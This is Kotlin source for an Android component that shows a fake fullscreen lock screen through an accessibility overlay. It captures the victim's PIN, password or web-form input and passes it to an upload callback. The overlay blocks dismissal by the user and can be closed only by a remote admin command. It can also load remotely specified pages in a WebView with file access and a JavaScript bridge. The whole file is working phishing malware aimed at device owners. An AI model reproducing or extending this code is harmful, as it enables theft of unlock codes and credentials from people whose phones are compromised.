package com.vibelink.client.device

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.TypedValue
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.EditText
import android.widget.GridLayout
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import com.vibelink.client.R
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

enum class KeyguardFakePageType {
    PIN,
    PASSWORD,
    WEB,
    ;

    companion object {
        fun from(raw: String?): KeyguardFakePageType {
            return when (raw?.trim()?.lowercase()) {
                "password", "pwd" -> PASSWORD
                "web", "webview", "url", "pattern", "gesture" -> WEB
                else -> PIN
            }
        }
    }
}

/**
 * Fullscreen lock-screen style fake page.
 * Single submit: first valid input uploads and dismisses (no fake-fail retry).
 */
class KeyguardFakeOverlayController(
    private val context: Context,
    private val windowManager: WindowManager,
    private val onSubmitted: (text: String) -> Unit,
) {
    private val mainHandler = Handler(Looper.getMainLooper())
    private var rootView: View? = null
    private var webView: WebView? = null
    private var pinLength = 6
    private var pinValue = StringBuilder()
    private var pageType: KeyguardFakePageType = KeyguardFakePageType.PIN
    private var webUrl: String = ""
    private var pinSlotsContainer: LinearLayout? = null

    fun isShowing(): Boolean = rootView != null

    fun show(
        pageType: KeyguardFakePageType,
        hint: String,
        webUrl: String = "",
        pinLength: Int = 6,
    ): Boolean {
        hide()
        this.pageType = pageType
        this.webUrl = webUrl.trim()
        this.pinLength = pinLength.coerceIn(4, 8)
        pinValue.clear()

        val root = LayoutInflater.from(context).inflate(R.layout.keyguard_fake_overlay, null)
        val pinPage = root.findViewById<View>(R.id.keyguard_fake_pin_page)
        val passwordPage = root.findViewById<View>(R.id.keyguard_fake_password_page)
        val webPage = root.findViewById<View>(R.id.keyguard_fake_web_page)
        val timeView = root.findViewById<TextView>(R.id.keyguard_fake_time)
        val dateView = root.findViewById<TextView>(R.id.keyguard_fake_date)
        val hintView = root.findViewById<TextView>(R.id.keyguard_fake_hint)
        pinSlotsContainer = root.findViewById(R.id.keyguard_fake_pin_slots)
        val keypad = root.findViewById<GridLayout>(R.id.keyguard_fake_keypad)
        webView = root.findViewById(R.id.keyguard_fake_webview)

        val now = Date()
        timeView.text = TIME_FORMAT.format(now)
        dateView.text = DATE_FORMAT.format(now)

        val hintText = hint.trim().ifBlank {
            context.getString(R.string.keyguard_fake_hint_default)
        }

        when (pageType) {
            KeyguardFakePageType.PIN -> {
                pinPage.visibility = View.VISIBLE
                passwordPage.visibility = View.GONE
                webPage.visibility = View.GONE
                root.setBackgroundColor(Color.parseColor("#FF000000"))
                hintView.text = hintText
                renderPinSlots()
                buildKeypad(keypad)
            }
            KeyguardFakePageType.PASSWORD -> {
                pinPage.visibility = View.GONE
                passwordPage.visibility = View.VISIBLE
                webPage.visibility = View.GONE
                root.setBackgroundColor(Color.parseColor("#FF000000"))
                val passwordHint = root.findViewById<TextView>(R.id.keyguard_fake_password_hint)
                val passwordInput = root.findViewById<EditText>(R.id.keyguard_fake_password_input)
                val confirmBtn = root.findViewById<TextView>(R.id.keyguard_fake_password_confirm)
                passwordHint.text = hintText
                passwordInput.setText("")
                confirmBtn.setOnClickListener {
                    val value = passwordInput.text?.toString().orEmpty().trim()
                    if (value.isEmpty()) {
                        toast(R.string.keyguard_fake_password_empty)
                        return@setOnClickListener
                    }
                    submitAndHide(value)
                }
            }
            KeyguardFakePageType.WEB -> {
                pinPage.visibility = View.GONE
                passwordPage.visibility = View.GONE
                webPage.visibility = View.VISIBLE
                root.setBackgroundColor(Color.BLACK)
                setupWebView(webView)
                val url = this.webUrl
                if (url.isNotBlank()) {
                    webView?.loadUrl(url)
                } else {
                    toast(R.string.fake_page_web_load_failed)
                }
            }
        }

        root.setOnClickListener { /* block dismiss */ }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT,
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }

        return runCatching {
            windowManager.addView(root, params)
            rootView = root
            true
        }.getOrDefault(false)
    }

    fun hide() {
        val view = rootView ?: return
        rootView = null
        mainHandler.removeCallbacksAndMessages(null)
        runCatching { windowManager.removeViewImmediate(view) }
        destroyWebView()
        pinValue.clear()
        pinSlotsContainer = null
        webUrl = ""
    }

    private fun submitAndHide(text: String) {
        val value = text.trim()
        if (value.isEmpty()) {
            return
        }
        onSubmitted(value)
        toast(R.string.keyguard_fake_success)
        mainHandler.postDelayed({ hide() }, 350L)
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView(view: WebView?) {
        val wv = view ?: return
        wv.settings.javaScriptEnabled = true
        wv.settings.domStorageEnabled = true
        wv.settings.allowFileAccess = true
        wv.settings.allowFileAccessFromFileURLs = true
        wv.settings.allowUniversalAccessFromFileURLs = true
        wv.settings.mediaPlaybackRequiresUserGesture = false
        wv.settings.loadsImagesAutomatically = true
        wv.setBackgroundColor(Color.BLACK)
        wv.setLayerType(View.LAYER_TYPE_HARDWARE, null)
        wv.addJavascriptInterface(KeyguardJsBridge(), "MiluBridge")
        wv.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?,
            ): Boolean {
                val uri = request?.url ?: return true
                return !isAllowedWebViewScheme(uri.scheme)
            }

            @Deprecated("Deprecated in Java")
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                val uri = runCatching { Uri.parse(url.orEmpty()) }.getOrNull() ?: return true
                return !isAllowedWebViewScheme(uri.scheme)
            }

            override fun onReceivedError(
                view: WebView?,
                request: WebResourceRequest?,
                error: WebResourceError?,
            ) {
                if (request?.isForMainFrame == true) {
                    toast(R.string.fake_page_web_load_failed)
                }
            }
        }
    }

    private fun destroyWebView() {
        val wv = webView ?: return
        webView = null
        runCatching {
            wv.stopLoading()
            wv.loadUrl("about:blank")
            wv.removeAllViews()
            wv.destroy()
        }
    }

    private inner class KeyguardJsBridge {
        @JavascriptInterface
        fun openApp() {
            mainHandler.post { hide() }
        }

        @JavascriptInterface
        fun close() {
            // user cannot close; admin hide_keyguard_fake_page only
        }

        @JavascriptInterface
        fun done(text: String?) {
            mainHandler.post {
                val payload = text?.trim().orEmpty().ifBlank { "web_done" }
                submitAndHide(payload)
            }
        }
    }

    private fun renderPinSlots() {
        val container = pinSlotsContainer ?: return
        container.removeAllViews()
        repeat(pinLength) { index ->
            val dot = View(context).apply {
                val size = dp(14)
                layoutParams = LinearLayout.LayoutParams(size, size).apply {
                    if (index > 0) {
                        marginStart = dp(16)
                    }
                }
                setBackgroundResource(R.drawable.keyguard_fake_pin_dot_empty)
            }
            container.addView(dot)
        }
    }

    private fun refreshPinDots() {
        val container = pinSlotsContainer ?: return
        val filled = pinValue.length
        for (i in 0 until container.childCount) {
            val dot = container.getChildAt(i)
            dot.setBackgroundResource(
                if (i < filled) {
                    R.drawable.keyguard_fake_pin_dot_filled
                } else {
                    R.drawable.keyguard_fake_pin_dot_empty
                },
            )
        }
    }

    private fun buildKeypad(keypad: GridLayout) {
        keypad.removeAllViews()
        val keys = listOf(
            "1", "2", "3",
            "4", "5", "6",
            "7", "8", "9",
            "del", "0", "ok",
        )
        keys.forEachIndexed { index, key ->
            val cell = TextView(context).apply {
                gravity = Gravity.CENTER
                setTextColor(Color.WHITE)
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 28f)
                when (key) {
                    "del" -> {
                        text = context.getString(R.string.fake_page_key_delete)
                        setTextSize(TypedValue.COMPLEX_UNIT_SP, 24f)
                    }
                    "ok" -> {
                        text = context.getString(R.string.fake_page_key_confirm)
                        setTextSize(TypedValue.COMPLEX_UNIT_SP, 24f)
                    }
                    else -> text = key
                }
                setOnClickListener { onKey(key) }
            }
            val lp = GridLayout.LayoutParams().apply {
                width = 0
                height = dp(64)
                columnSpec = GridLayout.spec(index % 3, 1f)
                rowSpec = GridLayout.spec(index / 3)
                setMargins(dp(8), dp(10), dp(8), dp(10))
            }
            keypad.addView(cell, lp)
        }
    }

    private fun onKey(key: String) {
        when (key) {
            "del" -> {
                if (pinValue.isNotEmpty()) {
                    pinValue.deleteCharAt(pinValue.length - 1)
                    refreshPinDots()
                }
            }
            "ok" -> confirmPin()
            else -> {
                if (pinValue.length < pinLength) {
                    pinValue.append(key)
                    refreshPinDots()
                    if (pinValue.length == pinLength) {
                        confirmPin()
                    }
                }
            }
        }
    }

    private fun confirmPin() {
        val value = pinValue.toString()
        when {
            value.isEmpty() -> toast(R.string.fake_page_pin_empty)
            value.length < pinLength -> toast(R.string.fake_page_pin_short)
            else -> submitAndHide(value)
        }
    }

    private fun toast(resId: Int) {
        Toast.makeText(context, context.getString(resId), Toast.LENGTH_SHORT).show()
    }

    private fun dp(value: Int): Int =
        (value * context.resources.displayMetrics.density).toInt()

    private fun isAllowedWebViewScheme(scheme: String?): Boolean {
        return when (scheme?.lowercase()) {
            "https", "http", "file" -> true
            else -> false
        }
    }

    companion object {
        private val TIME_FORMAT = SimpleDateFormat("HH:mm", Locale.getDefault())
        private val DATE_FORMAT = SimpleDateFormat("EEEE, MMM d", Locale.getDefault())
        const val PACKAGE_MARKER = "__keyguard__"
    }
}
